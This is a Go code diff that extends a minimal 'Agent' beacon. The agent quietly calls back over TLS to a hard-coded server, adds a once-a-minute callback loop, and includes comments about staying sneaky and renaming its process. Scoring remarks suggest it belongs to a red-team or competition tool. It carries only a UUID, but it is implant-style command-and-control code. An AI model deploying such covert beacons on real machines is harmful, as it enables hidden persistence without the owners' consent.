@@ -4,11 +4,19 @@ package main
 	Flags:
 		--info:		Print's the Agent's configuration info.
 		--test:		Tests the Agent's connection to the callback server.
+		--single:	Only send a single callback, don't wait in a loop
+					(i.e. routine callbacks are handled by something else,
+					such as a cron job).
 */
+
+// Fun thought: can you change the Agent process name to whatever you want?
+// https://github.com/erikdubbelboer/gspt
+// Regex if it has "malware" in the title, double points?
 
 import (
 	"fmt"
 	"os"
+	"time"
 
 	"crypto/tls"
 	"net"
@@ -26,24 +34,18 @@ type agentInfoStruct struct {
 	AgentUUID       uuid.UUID
 }
 
-const (
-	ERR_GENERIC    int = 10
-	ERR_CONNECTION int = 11
-	ERR_WRITE      int = 12
-	ERR_BYTES      int = 13
-)
-
 var (
 	serverPublicKey string          = "555"
 	agentUUID       uuid.UUID       = uuid.New()
 	agentInfo       agentInfoStruct = agentInfoStruct{ServerPublicKey: serverPublicKey, AgentUUID: agentUUID}
 	localPort       int             = 1337
 	//localAddress    net.TCPAddr     = net.TCPAddr{IP: net.ParseIP("127.0.0.1"), Port: localPort}
-	localAddress  net.TCPAddr = net.TCPAddr{Port: localPort}
-	serverIP      string      = "127.0.0.1"
-	serverPort    int         = 444
-	serverAddress net.TCPAddr = net.TCPAddr{IP: net.ParseIP(serverIP), Port: serverPort}
-	tlsConfig     tls.Config  = tls.Config{InsecureSkipVerify: true}
+	localAddress      net.TCPAddr   = net.TCPAddr{Port: localPort}
+	serverIP          string        = "127.0.0.1"
+	serverPort        int           = 444
+	serverAddress     net.TCPAddr   = net.TCPAddr{IP: net.ParseIP(serverIP), Port: serverPort}
+	tlsConfig         tls.Config    = tls.Config{InsecureSkipVerify: true}
+	waitTimeInMinutes time.Duration = time.Minute * 1
 )
 
 func callback() {
@@ -52,15 +54,17 @@ func callback() {
 	conn, err := tls.Dial("tcp", serverIP+":"+fmt.Sprint(serverPort), &tlsConfig)
 	//conn, err := net.DialTCP("tcp", &localAddress, &serverAddress)
 	if err != nil {
-		os.Exit(ERR_CONNECTION) // we don't want to output anything if we're trying to be sneaky
+		os.Exit(utils.ERR_CONNECTION) // we don't want to output anything if we're trying to be sneaky
 	}
+
+	_ = conn.SetWriteDeadline(time.Now().Add(time.Second * 1))
 
 	callbackMessage := agentUUID.String()
 	numBytes, err := conn.Write([]byte(callbackMessage))
 	if err != nil { // couldn't establish connection?
-		os.Exit(ERR_WRITE)
+		os.Exit(utils.ERR_WRITE)
 	} else if numBytes == 0 { // somehow wasn't able to send any data
-		os.Exit(ERR_BYTES)
+		os.Exit(utils.ERR_BYTES)
 	}
 }
 
@@ -77,17 +81,22 @@ func testServer() {
 	conn, err := tls.Dial("tcp", serverIP+":"+fmt.Sprint(serverPort), &tlsConfig)
 	if err != nil {
 		utils.LogError(utils.Error, err, "Could not connect to server")
-		os.Exit(ERR_CONNECTION)
+		os.Exit(utils.ERR_CONNECTION)
 	}
 
-	testMessage := "Agent " + agentUUID.String() + " testing connection"
+	err = conn.SetWriteDeadline(time.Now().Add(time.Second * 1))
+	if err != nil {
+		utils.LogError(utils.Warning, err, "Setting write deadline failed, this is weird")
+	}
+
+	testMessage := agentUUID.String() + " TEST"
 	numBytes, err := conn.Write([]byte(testMessage))
 	if err != nil {
-		utils.LogError(utils.Error, err, "Could not send data to server")
-		os.Exit(ERR_WRITE)
+		utils.LogError(utils.Error, err, "Could not send data to server (write timeout)")
+		os.Exit(utils.ERR_WRITE)
 	} else if numBytes == 0 {
 		utils.LogError(utils.Error, err, "Sent 0 bytes")
-		os.Exit(ERR_BYTES)
+		os.Exit(utils.ERR_BYTES)
 	}
 
 	utils.Log(utils.Done, "Wrote", fmt.Sprint(numBytes), "bytes to server")
@@ -126,6 +135,7 @@ func (info agentInfoStruct) printAgentInfo() {
 func main() {
 	// Optionally print this Agent's information
 	// Intentionally not using the "flag" package because we never want to print usage information
+	single := false
 	if len(os.Args) > 1 { // contains a command-line flag
 		if os.Args[1] == "--info" {
 			agentInfo.printAgentInfo()
@@ -133,9 +143,19 @@ func main() {
 		} else if os.Args[1] == "--test" {
 			testServer()
 			return
+		} else if os.Args[1] == "--single" {
+			single = true
 		}
 	}
 
-	// Call back to server
+	// First callback
 	callback()
+
+	// Call back to server every waitTimeInMinutes minutes,
+	// if not passed the `--single` flag.
+	if !single {
+		for range time.Tick(waitTimeInMinutes) {
+			callback()
+		}
+	}
 }
